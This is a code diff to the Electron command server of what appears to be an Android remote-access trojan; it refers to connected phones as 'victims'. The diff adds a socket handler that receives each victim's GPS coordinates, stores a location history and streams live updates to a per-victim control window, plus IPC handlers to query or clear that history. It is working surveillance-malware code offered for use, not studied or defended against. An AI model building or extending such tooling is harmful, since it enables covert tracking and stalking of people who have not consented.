@@ -4,7 +4,6 @@ const { ipcMain } = require('electron');
 var io = require('socket.io');
 var geoip = require('geoip-lite');
 var victimsList = require('./app/assets/js/model/Victim');
-var { sendPushToDevice, sendPushToMultipleDevices } = require('./sendPush');
 var deviceManager = require('./deviceManager');
 module.exports = victimsList;
 //--------------------------------------------------------------
@@ -210,6 +209,28 @@ ipcMain.on('SocketIO:Listen', function (event, port) {
     //notify renderer proccess (AppCtrl) about the new Victim
     win.webContents.send('SocketIO:NewVictim', index);
 
+    // Xử lý location data từ client
+    socket.on('x0000lm', function (data) {
+      if (data && data.enable && data.lat !== 0 && data.lng !== 0) {
+        // Lưu location vào history
+        deviceManager.addLocationToHistory(index, {
+          lat: data.lat,
+          lng: data.lng,
+          accuracy: data.accuracy || null,
+          address: data.address || null
+        });
+
+        // Gửi thông báo đến lab window nếu đang mở
+        if (windows[index]) {
+          BrowserWindow.fromId(windows[index]).webContents.send('SocketIO:LocationUpdated', {
+            deviceId: index,
+            location: data,
+            history: deviceManager.getLocationHistory(index)
+          });
+        }
+      }
+    });
+
     socket.on('disconnect', function () {
       // Decrease the socket count on a disconnect
       victimsList.rmVictim(index);
@@ -302,6 +323,7 @@ ipcMain.on('openLabWindow', function (e, page, index) {
 
     // pass the victim info to this victim lab
     child.webContents.victim = victim.socket;
+    child.webContents.victimId = index; // Thêm victimId vào webContents
     child.loadFile(__dirname + '/app/' + page)
 
     child.once('ready-to-show', () => {
@@ -382,6 +404,48 @@ ipcMain.on('getDeviceStats', function (event) {
     event.reply('getDeviceStatsResponse', { success: true, stats: stats });
   } catch (error) {
     event.reply('getDeviceStatsResponse', { success: false, message: 'Error getting device stats: ' + error.message });
+  }
+});
+
+// IPC handlers cho location history
+ipcMain.on('getLocationHistory', function (event, deviceId) {
+  try {
+    const history = deviceManager.getLocationHistory(deviceId);
+    event.reply('getLocationHistoryResponse', { success: true, history: history, deviceId });
+  } catch (error) {
+    event.reply('getLocationHistoryResponse', { success: false, message: 'Error getting location history: ' + error.message, deviceId });
+  }
+});
+
+ipcMain.on('clearLocationHistory', function (event, deviceId) {
+  try {
+    const success = deviceManager.clearLocationHistory(deviceId);
+    event.reply('clearLocationHistoryResponse', { success: success, deviceId });
+  } catch (error) {
+    event.reply('clearLocationHistoryResponse', { success: false, message: 'Error clearing location history: ' + error.message, deviceId });
+  }
+});
+
+ipcMain.on('getLatestLocation', function (event, deviceId) {
+  try {
+    const location = deviceManager.getLatestLocation(deviceId);
+    event.reply('getLatestLocationResponse', { success: true, location: location, deviceId });
+  } catch (error) {
+    event.reply('getLatestLocationResponse', { success: false, message: 'Error getting latest location: ' + error.message, deviceId });
+  }
+});
+
+// IPC handler để lấy victimId của window hiện tại
+ipcMain.on('getCurrentVictimId', function (event) {
+  try {
+    const win = BrowserWindow.fromWebContents(event.sender);
+    if (win && win.webContents && win.webContents.victimId) {
+      event.reply('getCurrentVictimIdResponse', { success: true, victimId: win.webContents.victimId });
+    } else {
+      event.reply('getCurrentVictimIdResponse', { success: false, message: 'VictimId not found' });
+    }
+  } catch (error) {
+    event.reply('getCurrentVictimIdResponse', { success: false, message: 'Error getting victimId: ' + error.message });
   }
 });
 
